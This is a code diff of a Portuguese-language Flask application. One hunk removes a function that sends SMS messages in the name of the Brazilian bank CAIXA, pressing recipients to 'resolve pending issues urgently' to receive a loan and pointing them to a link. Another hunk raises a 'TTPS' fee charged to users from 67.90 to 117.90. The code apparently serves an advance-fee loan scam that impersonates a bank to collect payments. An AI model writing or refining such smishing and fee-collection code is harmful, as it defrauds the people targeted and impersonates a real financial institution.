@@ -1345,95 +1345,6 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
         app.logger.error(f"Error in send_sms: {str(e)}")
         return False
         
-def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
-    """
-    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
-    """
-    try:
-        if not phone_number:
-            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
-            return False
-            
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-        
-        # Verifica se é um número brasileiro válido
-        # Aceita números com ou sem o prefixo internacional (+55)
-        # Formato BR: DDD + 9 dígitos (11 no total) ou +55 + DDD + 9 dígitos (13 no total)
-        if len(formatted_phone) == 13 and formatted_phone.startswith('55'):
-            # Se começa com 55, verifica se o restante tem 11 dígitos
-            if len(formatted_phone[2:]) != 11:
-                app.logger.error(f"[PROD] Formato inválido de número de telefone brasileiro com prefixo: {phone_number}")
-                return False
-            # Número está no formato internacional, mantém apenas o número brasileiro
-            formatted_phone = formatted_phone[2:]
-        elif len(formatted_phone) != 11:
-            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number} (após formatação: {formatted_phone})")
-            return False
-            
-        app.logger.info(f"[PROD] Número de telefone formatado: {formatted_phone}")
-        
-        # Garantir que o número seja tratado como brasileiro para SMS
-        if not formatted_phone.startswith('55'):
-            formatted_phone = '55' + formatted_phone
-            
-        # Formata CPF para exibição (XXX.XXX.XXX-XX)
-        cpf_formatado = format_cpf(cpf) if cpf else ""
-        
-        # Criar mensagem personalizada com link para thank_you_url
-        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
-        
-        # Garantir que a URL está codificada corretamente
-        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
-        import urllib.parse
-        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
-        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
-            # Extrair a base da URL e os parâmetros
-            if '?' in thank_you_url:
-                base_url, query_part = thank_you_url.split('?', 1)
-                params = {}
-                for param in query_part.split('&'):
-                    if '=' in param:
-                        key, value = param.split('=', 1)
-                        params[key] = value
-                
-                # Recriar a URL com parâmetros codificados
-                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
-                thank_you_url = f"{base_url}?{query_string}"
-                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
-        
-        # Mensagem mais informativa para o cliente
-        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
-        
-        # Log detalhado para debugging
-        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
-        
-        # Fazer várias tentativas de envio para maior garantia
-        max_attempts = 3
-        attempt = 0
-        success = False
-        
-        while attempt < max_attempts and not success:
-            attempt += 1
-            try:
-                # Usar exclusivamente a API SMSDEV para confirmação de pagamento
-                app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS de confirmação")
-                success = send_sms_smsdev(phone_number, message)
-                
-                if success:
-                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} via SMSDEV")
-                    break
-                else:
-                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts} via SMSDEV")
-                    time.sleep(1.0)  # Aumentando o intervalo entre tentativas
-            except Exception as e:
-                app.logger.error(f"[PROD] Erro na tentativa {attempt} com SMSDEV: {str(e)}")
-        
-        return success
-
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
-        return False
 
 def generate_random_email(name: str) -> str:
     clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
@@ -3991,7 +3902,7 @@ def pagar_ttps():
             }
         
         # Valor da TTPS
-        ttps_value = 67.90
+        ttps_value = 117.90
         transaction_id = ""
         
         # Gerar pagamento na API de pagamento configurada
